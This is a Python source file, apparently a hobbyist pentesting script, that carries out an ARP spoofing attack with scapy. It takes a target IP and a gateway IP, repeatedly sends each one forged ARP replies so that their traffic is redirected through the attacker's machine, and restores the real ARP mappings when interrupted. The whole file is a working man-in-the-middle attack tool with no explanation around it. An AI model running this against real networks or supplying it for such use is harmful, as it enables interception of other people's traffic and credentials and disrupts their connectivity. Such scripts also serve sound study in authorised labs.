import scapy.all as scapy
import time
import optparse


def getInput():
    parseObject = optparse.OptionParser()
    parseObject.add_option("-t", "--ip", dest="ipAddress")
    parseObject.add_option("-g", "--ip2", dest="ipAddress2")

    options = parseObject.parse_args()[0]

    if not options.ipAddress:
        print("Enter The IP...")
    if not options.ipAddress2:
        print("Enter The IP2...")

    return options


def getMacAddress(ipAddress):
    answeredList = scapy.srp(scapy.Ether(
        dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ipAddress), timeout=2, verbose=False)[0]
    return answeredList[0][1].hwsrc


def arpPoisoning(targetIp, poisonedIP):
    targetMac = getMacAddress(targetIp)
    arpResponse = scapy.ARP(op=2, pdst=targetIp,
                            hwdst=targetMac, psrc=poisonedIP)
    scapy.send(arpResponse, verbose=False)


def resetOperation(fooledIP, gatewayIp):
    fooledMac = getMacAddress(fooledIP)
    gatewayMac = getMacAddress(gatewayIp)
    arpResponse = scapy.ARP(op=2, pdst=fooledIP,
                            hwdst=fooledMac, psrc=gatewayIp, hwsrc=gatewayMac)
    scapy.send(arpResponse, verbose=False, count=6)


number = 0
userIps = getInput()
userTargetIp = userIps.ipAddress
userGateWayIp = userIps.ipAddress2

try:
    while True:
        arpPoisoning(userIps.ipAddress, userIps.ipAddress2)
        arpPoisoning(userIps.ipAddress2, userIps.ipAddress)
        number += 2
        print("\rSending Packets: " + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit & Reset")
    resetOperation(userIps.ipAddress, userIps.ipAddress2)
    resetOperation(userIps.ipAddress2, userIps.ipAddress)
